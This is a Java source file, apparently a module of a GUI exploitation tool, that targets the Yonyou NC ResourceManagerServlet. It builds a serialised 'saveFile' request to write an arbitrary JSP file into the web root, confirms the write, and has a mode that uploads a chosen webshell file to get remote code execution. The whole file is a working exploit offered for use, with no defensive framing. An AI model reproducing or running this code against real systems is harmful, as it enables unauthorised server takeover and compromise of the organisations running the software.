package exp.oa.yongyou.nc;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Date;
import java.util.HashMap;

public class yongyou_nc_ResourceManagerServlet_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea,TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attgetshell(url,cmd,textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
//        return get_shell(url,textArea);
        return null;
    }


    public static String target_url(String url, String payload) {
        try {
            HttpTools get_res = new HttpTools();
            long t = (new Date()).getTime();
            String filename = t+".jsp";
            HashMap<String, String> hm = new HashMap();
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bo);
            hm.put("cmd", "saveFile");
            hm.put("id", "webapps\\nc_web\\" + filename);
            hm.put("group", "");
            oos.writeObject(hm);
            HashMap head = new HashMap<>();
            head.put("Content-Type","multipart/form-data;");
//            (new utils.HttpURLHttp()).post(url + "/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet", byteMerger(bo.toByteArray(), payload.getBytes()), new byte[][]{"Content-Type: multipart/form-data;".getBytes()});
            HttpTools.post_byte(url+"/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet", byteMerger(bo.toByteArray(), payload.getBytes()),head,"utf-8");

            String result = get_res.get(url + "/" + filename, new HashMap<>(),"utf-8").getText();

            if (result.contains(payload.substring(0,2)) && !result.isEmpty()){
                return url + "/" + filename;
            }
        } catch (Exception e){
            return null;
        }
        return null;
    }



    private Boolean att(String url, TextArea textArea) {
        try {
//            String shell_payload = shell.readFile(shell.Jsppath);
            String payload = "Hello R4g";
            String result = target_url(url,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ yongyou_ResourceManagerServlet_upload ]");
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }

        return false;
    }


    private boolean attgetshell(String url,String pass,TextArea textArea,TextArea textArea_cmd){
        try {


            String shell_payload = Methods.readFile(pass);
            long tt = (new Date()).getTime();
            String payload = tt+"\n" + shell_payload;
            String result = target_url(url,payload);


            if ( result != null) {
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: "+result+"----"+tt);
                    });
                    return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }

        return false;
    }

    public static byte[] byteMerger(byte[] bt1, byte[] bt2) {
        if (bt2 == null) {
            return bt1;
        } else {
            byte[] bt3 = new byte[bt1.length + bt2.length];
            System.arraycopy(bt1, 0, bt3, 0, bt1.length);
            System.arraycopy(bt2, 0, bt3, bt1.length, bt2.length);
            return bt3;
        }
    }

}
